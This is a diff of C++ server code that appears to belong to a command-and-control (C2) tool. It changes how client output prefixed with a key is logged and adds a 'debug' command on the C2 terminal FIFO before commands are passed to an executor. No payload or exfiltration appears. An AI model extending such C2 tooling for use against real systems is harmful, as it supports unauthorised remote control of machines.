@@ -243,8 +243,8 @@ void Server::handle_client(ClientHandler* client) {
             break; // @todo find a better way to handle client disconnection
         } else {
             // Test
-            if (strncmp(buffer, "$xt", 3) == 0) {
-                event_log << CYAN << buffer + 4 << RESET_C2_FIFO;
+            if (strncmp(buffer, OUT_KEY, 6) == 0) {
+                event_log << CYAN << buffer + 6 << RESET_C2_FIFO;
             } else {
                 event_log << LOG_MINOR_EVENTS <<  GREEN << "[Server::handle_client] Data from client " << client->index() << ": " << buffer << RESET;                
             }
@@ -389,8 +389,18 @@ void Server::handle_c2() {
                         event_log << YELLOW << "[Server::handle_c2] C2 terminal exit command received" << RESET;
                         shutdown_flag_ = true;
                         goto c2_cleanup;
-                    }
-
+                    } else if (strncmp(cmd, "debug", 5) == 0) {
+                        event_log << YELLOW << "[Server::handle_c2] Debug command received" << RESET;
+                        const char* debug_message = "Debug message from server\n";
+                        ssize_t bytes_written = write(c2_fifo_.fd_out, debug_message, strlen(debug_message));
+                        if (bytes_written < 0) {
+                            event_log << RED << "[Server::handle_c2] Error writing to FIFO: " << strerror(errno) << RESET;
+                            goto c2_cleanup;
+                        }
+                        event_log << LOG_MINOR_EVENTS << GREEN << "[Server::handle_c2] Debug message sent to C2 terminal" << RESET;
+                        continue;
+                    } 
+                    
                     command_handler.execute_command(cmd, bytes_read);                    
                 }
             }
